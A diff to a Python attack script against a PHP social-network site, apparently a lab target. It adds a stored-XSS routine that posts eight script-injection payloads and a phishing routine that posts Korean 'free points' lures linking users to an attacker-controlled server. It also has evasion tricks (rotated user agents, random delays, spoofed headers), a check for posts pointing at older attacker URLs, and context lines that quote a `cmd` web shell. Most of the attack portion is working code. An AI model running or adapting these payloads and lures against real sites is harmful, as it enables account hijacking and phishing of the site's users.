@@ -671,18 +671,160 @@ if(isset($_GET["cmd"])) {
         print(f"\n[*] LFI/RCE Results: {success_count} successful operations")
         return success_count > 0
     
-    def test_xss_csrf_combined(self):
-        """XSS + CSRF Combined Attack"""
-        self.print_section("XSS + CSRF - Malicious Post with Direct Link")
-        
+    def clear_old_posts(self):
+        """Check and optionally clear old posts with incorrect attacker server URLs"""
+        self.print_section("Checking for Old Posts")
+
         if not self.logged_in:
             print("[-] Login required")
             return False
-        
+
+        try:
+            print(f"[*] Checking for posts with old/incorrect attacker server URLs...")
+            print(f"[*] Current attacker server: {self.attacker_server}")
+
+            response = self.session.get(f"{self.base_url}/index.php", timeout=30)
+            soup = BeautifulSoup(response.text, 'html.parser')
+
+            # Find all posts
+            posts = soup.find_all('div', class_='post')
+            print(f"[*] Found {len(posts)} total posts on feed")
+
+            old_posts_count = 0
+            for post in posts:
+                post_content = post.get_text()
+                # Look for URLs that DON'T match current attacker server
+                if 'http://' in post_content or 'https://' in post_content:
+                    # Extract URLs from post
+                    urls = re.findall(r'https?://[\d\.:]+(:\d+)?/[^\s]*', post_content)
+                    for url in urls:
+                        if self.attacker_server not in url:
+                            old_posts_count += 1
+                            print(f"[!] Found old post with URL: {url[:80]}...")
+
+            if old_posts_count > 0:
+                print(f"\n[!] WARNING: Found {old_posts_count} posts with OLD attacker server URLs")
+                print(f"[!] These posts redirect to old servers instead of {self.attacker_server}")
+                print(f"\n[*] To fix the redirect issue:")
+                print(f"    1. Delete old posts from the database")
+                print(f"    2. Or truncate the posts table: TRUNCATE TABLE posts;")
+                print(f"    3. Then run this script again to create fresh posts")
+            else:
+                print(f"[+] No old posts found - all URLs match current attacker server")
+
+            return old_posts_count > 0
+
+        except Exception as e:
+            print(f"[-] Error checking posts: {str(e)[:100]}")
+            return False
+
+    def test_xss_stored(self):
+        """Test Stored XSS vulnerabilities with script tags"""
+        self.print_section("Stored XSS - Script Injection in Posts")
+
+        if not self.logged_in:
+            print("[-] Login required")
+            return False
+
+        post_url = f"{self.base_url}/new_post.php"
+
+        # XSS payloads to test
+        xss_payloads = [
+            ('<script>alert("XSS")</script>', 'Basic script tag'),
+            ('<img src=x onerror=alert("XSS")>', 'Image onerror event'),
+            ('<svg/onload=alert("XSS")>', 'SVG onload event'),
+            ('"><script>alert("XSS")</script>', 'Breaking out of attribute'),
+            ('<iframe src="javascript:alert(\'XSS\')"></iframe>', 'Iframe javascript protocol'),
+            ('<body onload=alert("XSS")>', 'Body onload'),
+            ('<input onfocus=alert("XSS") autofocus>', 'Input autofocus'),
+            ('<marquee onstart=alert("XSS")>', 'Marquee onstart'),
+        ]
+
+        xss_found = False
+
+        for payload, desc in xss_payloads:
+            try:
+                self._rotate_user_agent()
+                self._random_delay(2.0, 4.0)
+
+                print(f"\n[*] Testing XSS: {desc}")
+                print(f"    Payload: {payload[:60]}...")
+
+                data = {'content': payload}
+                headers = self._add_legitimate_headers(post_url)
+                headers['Origin'] = self.base_url
+                headers['Content-Type'] = 'application/x-www-form-urlencoded'
+
+                response = self.session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=30)
+
+                print(f"    Status: {response.status_code}")
+
+                # Check if payload is reflected without sanitization
+                time.sleep(0.5)
+                check = self.session.get(f"{self.base_url}/index.php")
+
+                # Check if our payload appears UNESCAPED in the response
+                if payload in check.text:
+                    print(f"[+] SUCCESS! Stored XSS vulnerability found!")
+                    print(f"    Payload is reflected without sanitization")
+                    print(f"    XSS Type: {desc}")
+
+                    vuln_info = {
+                        'url': post_url,
+                        'payload': payload,
+                        'description': f'Stored XSS: {desc}',
+                        'attack_type': 'stored_xss',
+                        'impact': 'HIGH - JavaScript execution in victim browsers, session hijacking possible',
+                        'cvss_score': 7.5
+                    }
+                    self.vulnerabilities['xss'].append(vuln_info)
+
+                    self.log_event(
+                        'STORED_XSS',
+                        f'Stored XSS vulnerability confirmed: {desc}',
+                        'HIGH',
+                        {
+                            'payload': payload,
+                            'location': 'post content',
+                            'xss_type': desc
+                        }
+                    )
+
+                    xss_found = True
+                    break  # Stop after first successful XSS to avoid cluttering feed
+
+                elif payload[:50] in check.text:
+                    # Payload exists but might be sanitized
+                    print(f"[*] Payload found in response but may be sanitized")
+                    # Check if it's HTML encoded
+                    if '&lt;' in check.text or '&gt;' in check.text:
+                        print(f"[-] XSS blocked: Payload is HTML-encoded")
+                    else:
+                        print(f"[?] Unclear if XSS is blocked - manual verification needed")
+                else:
+                    print(f"[-] Payload not found in feed - may have been filtered")
+
+            except Exception as e:
+                print(f"[-] Error testing XSS payload: {str(e)[:100]}")
+                continue
+
+        if not xss_found:
+            print(f"\n[-] No XSS vulnerabilities found (payloads filtered or sanitized)")
+
+        return xss_found
+
+    def test_csrf_phishing(self):
+        """Create phishing post with link to attacker server (CSRF attack)"""
+        self.print_section("CSRF - Phishing Post with Attacker Link")
+
+        if not self.logged_in:
+            print("[-] Login required")
+            return False
+
         if not self.attacker_user_id:
             print("[-] Attacker user ID not found")
             return False
-        
+
         post_url = f"{self.base_url}/new_post.php"
         # Add timestamp to prevent caching and ensure fresh link
         timestamp = int(time.time())
@@ -692,27 +834,20 @@ if(isset($_GET["cmd"])) {
         print(f"[*] Attacker User ID: {self.attacker_user_id}")
         print(f"[*] Target URL: {attacker_url}")
         print(f"[*] Attacker Server: {self.attacker_server}")  # Debug: Show current server
-        
-        payload = f'''🎁 특별 이벤트! 🎁
 
-무료 10,000 포인트 받기!
-지금 클릭하세요: {attacker_url}
-
-선착순 100명! 서두르세요!'''
-        
         # Try multiple payload variations to bypass filters
         payloads_to_try = [
             (f'''안녕하세요! 좋은 하루 되세요 😊''', 'Innocent warm-up post'),
 
-            (f'''특별 이벤트 안내
-{attacker_url.replace('http', 'hxxp').replace(':', '[:]')}
-참여 부탁드립니다''', 'Obfuscated URL'),
-
-            (f'''이벤트 링크: {attacker_url}''', 'Simple link'),
-
             (f'''🎁 무료 포인트 이벤트
 링크: {attacker_url}
 서두르세요!''', 'Direct link with emojis'),
+
+            (f'''특별 이벤트 안내
+{attacker_url}
+참여 부탁드립니다''', 'Simple announcement'),
+
+            (f'''이벤트 링크: {attacker_url}''', 'Simple link'),
         ]
 
         for payload, desc in payloads_to_try:
@@ -769,18 +904,18 @@ if(isset($_GET["cmd"])) {
                         vuln_info = {
                             'url': post_url,
                             'payload': payload,
-                            'description': f'Post created: {desc}',
+                            'description': f'CSRF phishing post: {desc}',
                             'attack_type': 'phishing_csrf',
                             'target_url': attacker_url,
                             'attacker_id': self.attacker_user_id,
                             'impact': 'CRITICAL - CSRF allows unauthorized actions on behalf of victim',
                             'cvss_score': 8.8
                         }
-                        self.vulnerabilities['xss'].append(vuln_info)
+                        self.vulnerabilities['csrf'].append(vuln_info)
 
                         self.log_event(
-                            'XSS_CSRF',
-                            f'Malicious post created: {desc}',
+                            'CSRF_PHISHING',
+                            f'Malicious CSRF phishing post created: {desc}',
                             'CRITICAL',
                             {
                                 'post_url': post_url,
@@ -1495,21 +1630,21 @@ if(isset($_GET["cmd"])) {
                     <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                 </h3>
                 <div class="vuln-detail">
-                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
+                    <strong>취약 URL:</strong> <code>{vuln.get('url', 'N/A')}</code>
                 </div>
                 <div class="vuln-detail">
-                    <strong>공격 유형:</strong> {vuln['attack_type']}
+                    <strong>공격 유형:</strong> {vuln.get('attack_type', 'N/A')}
                 </div>
                 <div class="vuln-detail">
-                    <strong>공격자 서버:</strong> <code>{vuln['target_url']}</code>
+                    <strong>공격자 서버:</strong> <code>{vuln.get('target_url', 'N/A')}</code>
                 </div>
                 <div class="vuln-detail">
                     <strong>페이로드 내용:</strong><br>
                     <code style="display: block; white-space: pre-wrap; padding: 10px; background: #f8f9fa;">
-{vuln['payload'][:200]}...</code>
+{vuln.get('payload', 'N/A')[:200]}...</code>
                 </div>
                 <div class="vuln-detail">
-                    <strong>영향도:</strong> {vuln['impact']}
+                    <strong>영향도:</strong> {vuln.get('impact', 'N/A')}
                 </div>
                 <div class="recommendations">
                     <h3>🔧 수정 방안</h3>
@@ -2012,12 +2147,22 @@ Immediate remediation is strongly recommended to prevent unauthorized access and
         self._random_delay(2.0, 4.0)
         self.test_lfi()
 
-        # 4. XSS + CSRF Combined
-        print("\n[*] Testing social engineering attacks...")
-        self._random_delay(3.0, 6.0)
-        self.test_xss_csrf_combined()
+        # 4. Check for old posts with incorrect attacker URLs
+        print("\n[*] Checking for old malicious posts...")
+        self._random_delay(1.0, 2.0)
+        self.clear_old_posts()
 
-        # 5. fake-gift 페이지 생성
+        # 5. Test Stored XSS
+        print("\n[*] Testing Stored XSS vulnerabilities...")
+        self._random_delay(2.0, 4.0)
+        self.test_xss_stored()
+
+        # 6. Test CSRF Phishing
+        print("\n[*] Testing CSRF phishing attacks...")
+        self._random_delay(3.0, 6.0)
+        self.test_csrf_phishing()
+
+        # 7. fake-gift 페이지 생성
         self.generate_fake_gift_page()
         
         self.log_event('SCAN_COMPLETE', f'Security assessment completed. {sum(len(v) for v in self.vulnerabilities.values())} vulnerabilities found', 'INFO')
